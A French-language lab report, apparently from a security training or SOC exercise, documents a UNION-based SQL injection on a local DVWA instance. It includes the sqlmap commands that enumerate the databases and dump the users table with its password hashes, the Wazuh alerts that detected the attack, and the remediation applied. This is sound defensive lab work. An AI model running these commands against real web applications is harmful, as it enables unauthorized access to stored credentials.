# Attaque 3 — Injection SQL (SQLmap)

## Contexte
Exploitation d'une vulnérabilité d'injection SQL sur DVWA (Damn Vulnerable Web Application) installée sur la machine cible.

## Informations

| Champ | Détail |
|-------|--------|
| Date | 2026-04-11 |
| Heure | 11:10:00 UTC |
| Source | 192.168.64.30 (Kali Linux) |
| Cible | http://192.168.64.20/dvwa |
| Outil | SQLmap 1.7 |
| Technique MITRE | T1190 — Exploit Public-Facing Application |
| Type | UNION-based SQL Injection |

## Préparation — Installation DVWA sur la cible

```bash
sudo apt install -y apache2 php php-mysql mysql-server
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa
sudo chown -R www-data:www-data dvwa/
```

## Commandes exécutées

```bash
# Détection automatique des injections SQL
sqlmap -u "http://192.168.64.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxxx; security=low" \
  --dbs --batch

# Extraction des tables
sqlmap -u "http://192.168.64.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxxx; security=low" \
  -D dvwa --tables --batch

# Extraction des données utilisateurs
sqlmap -u "http://192.168.64.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxxx; security=low" \
  -D dvwa -T users --dump --batch
```

## Résultats

SQLmap a identifié une injection de type UNION-based et extrait les tables `users` et `guestbook` incluant les hashes de mots de passe.

## Alertes générées dans Wazuh

| Règle | Niveau | Description | Verdict |
|-------|--------|-------------|---------|
| 31101 | 6 | Apache web attack detected | Vrai positif |
| 100005 | 10 | Custom — Injection SQL dans logs web | Vrai positif |

## Remédiation appliquée

- Activation du WAF ModSecurity sur Apache
- Utilisation de requêtes préparées (PDO) dans le code PHP
- Validation et échappement des entrées utilisateur
- Mise à jour du niveau de sécurité DVWA en "high"
